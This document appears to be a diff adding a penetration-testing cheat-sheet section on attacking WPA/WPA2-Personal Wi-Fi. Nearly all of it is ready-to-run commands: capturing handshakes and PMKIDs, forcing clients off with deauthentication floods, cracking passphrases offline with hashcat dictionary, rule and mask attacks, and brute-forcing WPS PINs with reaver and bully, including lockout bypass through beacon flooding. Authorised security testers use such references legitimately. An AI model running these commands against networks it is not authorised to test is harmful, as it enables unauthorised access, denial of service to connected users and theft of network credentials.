@@ -1,0 +1,20 @@
+**WPA/WPA2-Personal (PSK) Testing**:
+- **Handshake Capture**:
+  - `airodump-ng -c <CH> --bssid <BSSID> -w wpa wlan0mon`
+  - Deauth: `aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon`
+  - PMKID Attack (no client needed):
+    - `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1`
+    - `hcxpcapngtool -z pmkid.16800 pmkid.pcapng`
+- **Offline Cracking**:
+  - Dictionary: `hashcat -m 2500 wpa.hccapx rockyou.txt`
+  - PMKID: `hashcat -m 16800 pmkid.16800 rockyou.txt`
+  - Rules: `hashcat -m 2500 -r rules/best64.rule wpa.hccapx rockyou.txt`
+  - Mask: `hashcat -m 2500 wpa.hccapx ?d?d?d?d?d?d?d?d`
+  - GPU: `hashcat -m 2500 -O wpa.hccapx rockyou.txt`
+- **Rainbow Tables**:
+  - `airolib-ng`, `genpmk` (pre-computed)
+- **WPS Testing**:
+  - `wash -i wlan0mon` (scan)
+  - `reaver -i wlan0mon -b <BSSID> -vv -K 1` (Pixie Dust)
+  - `bully -b <BSSID> -c <CH> wlan0mon`
+  - Lockout bypass: `reaver -L`, `mdk4` beacon flood
